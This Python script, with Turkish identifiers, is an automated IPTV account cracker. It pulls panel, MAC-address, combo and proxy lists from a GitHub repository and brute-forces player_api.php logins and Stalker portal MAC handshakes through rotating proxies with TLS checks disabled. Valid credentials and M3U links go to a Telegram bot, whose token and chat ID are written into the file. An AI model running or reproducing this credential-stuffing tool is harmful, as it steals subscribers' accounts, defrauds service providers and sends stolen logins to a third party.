import os
import time
import random
import threading
import requests
from flask import Flask
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

app = Flask('')

@app.route('/')
def home():
    return "IPTV Tarayıcı Aktif!"

def run_web():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
CHAT_ID = "-1003901042500"

def telegrama_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print(f"[!] Telegram mesajı gönderilemedi: {e}")

HEADERd = {
    'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
    'X-User-Agent': 'Model: MAG322; Link: Ethernet,WiFi',
    'Accept': '*/*',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip',
    'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
}

def proxy_sec(proxy_listesi):
    if not proxy_listesi:
        return None
    p = random.choice(proxy_listesi).strip()
    if not p:
        return None
    if not p.startswith("http"):
        p = f"http://{p}"
    return {"http": p, "https": p}

def m3u_tara(panel, user, pas, proxy_listesi):
    api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
    proxies = proxy_sec(proxy_listesi)
    try:
        if proxies:
            res = requests.get(api_url, headers=HEADERd, timeout=3.5, verify=False, proxies=proxies)
        else:
            res = requests.get(api_url, headers=HEADERd, timeout=3.5, verify=False)
            
        if res.status_code == 200 and 'user_info' in res.text:
            if '"auth":1' in res.text or '"status":"Active"' in res.text:
                m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                mesaj = (
                    f"🔥 <b>M3U HİT BULUNDU!</b>\n"
                    f"🌐 <b>Panel:</b> http://{panel}\n"
                    f"👤 <b>User:</b> <code>{user}</code>\n"
                    f"🔑 <b>Pass:</b> <code>{pas}</code>\n"
                    f"🔗 <b>M3U:</b> {m3ulink}"
                )
                telegrama_gonder(mesaj)
                return True
    except:
        pass
    return False

def mac_tara(panel, mac, proxy_listesi):
    mac_url = f"http://{panel}/c/portal.imixs.com/stalker_portal/server/load.php?type=stb&action=handshake&mac={mac}"
    headers = {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'}
    proxies = proxy_sec(proxy_listesi)
    try:
        if proxies:
            res = requests.get(mac_url, headers=headers, timeout=3.5, verify=False, proxies=proxies)
        else:
            res = requests.get(mac_url, headers=headers, timeout=3.5, verify=False)
            
        if res.status_code == 200 and ('js' in res.text or 'token' in res.text):
            mesaj = (
                f"🔥 <b>MAC HİT BULUNDU!</b>\n"
                f"🌐 <b>Panel:</b> http://{panel}\n"
                f"🎯 <b>MAC:</b> <code>{mac}</code>"
            )
            telegrama_gonder(mesaj)
            return True
    except:
        pass
    return False

def arka_plan_tarayici():
    MAC_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/mac_list/MAC.txt"
    PANEL_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/panel_list/benzersiz_paneller.txt"
    COMBO_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/combo/userpass.txt"
    PROXY_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/proxy/proxy.txt"
    
    while True:
        try:
            proksiler = []
            try:
                r_proxy = requests.get(PROXY_RAW_URL, timeout=5)
                if r_proxy.status_code == 200:
                    proksiler = [p.strip() for p in r_proxy.text.splitlines() if p.strip()]
            except:
                pass

            maclar = []
            try:
                r_mac = requests.get(MAC_RAW_URL, timeout=5)
                if r_mac.status_code == 200:
                    maclar = [m.strip() for m in r_mac.text.splitlines() if m.strip()]
            except:
                pass

            paneller = []
            try:
                r_panel = requests.get(PANEL_RAW_URL, timeout=5)
                if r_panel.status_code == 200:
                    paneller = [p.strip().replace('http://', '').replace('https://', '') for p in r_panel.text.splitlines() if p.strip()]
            except:
                pass

            combolar = []
            try:
                r_combo = requests.get(COMBO_RAW_URL, timeout=5)
                if r_combo.status_code == 200:
                    for satir in r_combo.text.splitlines():
                        satir = satir.strip()
                        if ":" in satir:
                            parca = satir.split(":", 1)
                            combolar.append((parca[0].strip(), parca[1].strip()))
            except:
                pass

            if not paneller and not maclar and not combolar:
                telegrama_gonder("⚠️ <b>GitHub'dan veri okunamadı, liste boş!</b>")
                time.sleep(120)
                continue

            # MAC Tarama Kontrolü
            if maclar and paneller:
                telegrama_gonder("⏳ <b>MAC tarama başlatıldı</b>")
                for panel in paneller:
                    for mac in maclar:
                        mac_tara(panel, mac, proksiler)
                        time.sleep(0.05)
                telegrama_gonder("✅ <b>MAC tarama bitti</b>")
            else:
                print("[i] MAC listesi veya Panel listesi boş olduğu için MAC taraması atlandı.")

            # M3U Tarama Kontrolü
            if combolar and paneller:
                telegrama_gonder("⏳ <b>M3U tarama başlatıldı</b>")
                for panel in paneller:
                    for user, pas in combolar:
                        m3u_tara(panel, user, pas, proksiler)
                        time.sleep(0.05)
                telegrama_gonder("✅ <b>M3U tarama bitti</b>")
            else:
                print("[i] Combo listesi veya Panel listesi boş olduğu için M3U taraması atlandı.")

            time.sleep(300)

        except Exception as e:
            telegrama_gonder(f"❌ <b>Döngü Hatası:</b> {e}")
            time.sleep(30)

if __name__ == '__main__':
    t = threading.Thread(target=run_web)
    t.start()
    arka_plan_tarayici()